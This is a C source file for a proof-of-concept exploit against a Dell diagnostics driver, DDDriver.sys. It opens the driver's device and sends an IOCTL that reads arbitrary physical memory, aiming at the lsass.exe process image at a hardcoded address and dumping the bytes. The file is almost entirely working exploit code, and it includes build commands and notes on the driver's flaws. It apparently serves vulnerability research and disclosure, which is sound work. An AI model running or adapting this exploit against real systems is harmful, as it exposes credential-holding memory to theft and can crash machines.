// c:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat
// cl.exe /nologo /Ox /MT /W0 /GS- /DNDDEBUG /Tc phymem_read_lsass.c /link /OUT:phymem_read_lsass.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

/*
 * Dell DDDriver.sys Arbitrary Physical Memory Read PoC
 * 
 * Vulnerability: Arbitrary physical memory read via MmMapIoSpace
 * 
 * Attack: IOCTL 0x9c40241c directly reads arbitrary physical memory
 * Note: IOCTL 0x9c40244c (VA->PA) is broken on x64 due to incorrect casting
 * For this reason, for the purpose of demonstration, current physical address of the image section of the lsass.exe process
 * from the researcher's lab has been hardcoded. This address could as well be provided dynamically after being obtained
 * through another vulnerability, or a safe address validity testing primitive; physical addresses are easily predictable and could be
 * brute forced, but the practical challenged with this vulnerability alone (with IOCTL 0x9c40244c (VA->PA) not working correctly),
 * is the fact that since the driver does not provide any validation of the user-supplied address before passing it to MmMapIoSpace,
 * providing an incorrect value immediately causes a system crash.
 * 
 * Target: Dell DDDriver.sys (Dell Diagnostics Driver)
 * Device: \\.\DELLWALDOS
 */

#include <windows.h>
#include <stdio.h>
#include <winternl.h>

#define DEVICE_NAME "\\\\.\\DELLWALDOS"

// IOCTL codes
#define IOCTL_READ_PHYS_MEM 0x9c40241c  // Read physical memory

BOOL ReadPhysicalMemory(HANDLE hDevice, ULONGLONG physicalAddress, PVOID buffer, DWORD size) {
    DWORD bytesReturned;
    BOOL result;

    // Read physical memory directly via IOCTL 0x9c40241c
    result = DeviceIoControl(
        hDevice,
        IOCTL_READ_PHYS_MEM,
        &physicalAddress,        // Input: physical address
        sizeof(ULONGLONG),
        buffer,                  // Output: data buffer
        size,
        &bytesReturned,
        NULL
    );

    if (!result) {
        return FALSE;
    }
    return TRUE;
}

BOOL VerifyMZSignature(PVOID buffer) {
    WORD *signature = (WORD*)buffer;
    return (*signature == 0x5A4D); // "MZ"
}

void PrintHexDump(PVOID data, DWORD size) {
    BYTE *bytes = (BYTE*)data;
    DWORD i, j;
    printf("\n[+] Hex dump:\n");
    for (i = 0; i < size; i += 16) {
        printf("    %04X: ", i);
        // Hex values
        for (j = 0; j < 16 && i + j < size; j++) {
            printf("%02X ", bytes[i + j]);
        }
        // Padding
        for (; j < 16; j++) {
            printf("   ");
        }
        printf(" | ");
        // ASCII representation
        for (j = 0; j < 16 && i + j < size; j++) {
            BYTE c = bytes[i + j];
            printf("%c", (c >= 32 && c <= 126) ? c : '.');
        }    
        printf("\n");
    }
}

ULONGLONG ReadLsass(HANDLE hDevice) 
{
    BYTE buffer[0x100]; // pick only first 256 bytes for demo
	// target_address = 
	ULONGLONG targetAddr = 0x4725a000; // 7ff76a2c0000 03610d72 Oct 19 05:48:02 1971 C:\Windows\system32\lsass.exe for demo 
    
    printf("[*] Trying physical address: 0x%llX... ", targetAddr);
        
    if (ReadPhysicalMemory(hDevice, targetAddr, buffer, sizeof(buffer))) 
	{
        if (VerifyMZSignature(buffer))
		{
            printf("FOUND!\n");
            printf("[+] lsass.exe located at physical address: 0x%llX\n", targetAddr);
        }
		else
		{
			printf("ReadPhysicalMemory succeeded, but no MZ signature match found.\n");
		}
		printf("[+] Printing hexdump:\n");
		PrintHexDump(buffer, 0x100);
    } 
	else
	{
        printf("ReadPhysicalMemory Failed\n");
	}
    return 0;
}

int main() {
    HANDLE hDevice;
    PVOID kernelBase;
    ULONGLONG physicalAddress;
    BYTE buffer[0x1000];
    
    printf("========================================\n");
    printf("Dell DDDriver.sys Physical Memory Read PoC\n");
    printf("========================================\n\n");

    // Open the vulnerable driver
    printf("[*] Opening device %s...\n", DEVICE_NAME);
    hDevice = CreateFileA(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open device: 0x%X\n", GetLastError());
        printf("[-] Make sure DDDriver.sys is loaded and you have admin privileges\n");
        return 1;
    }

    printf("[+] Device opened successfully!\n\n");
	ReadLsass(hDevice);
    CloseHandle(hDevice);
    return 0;
}
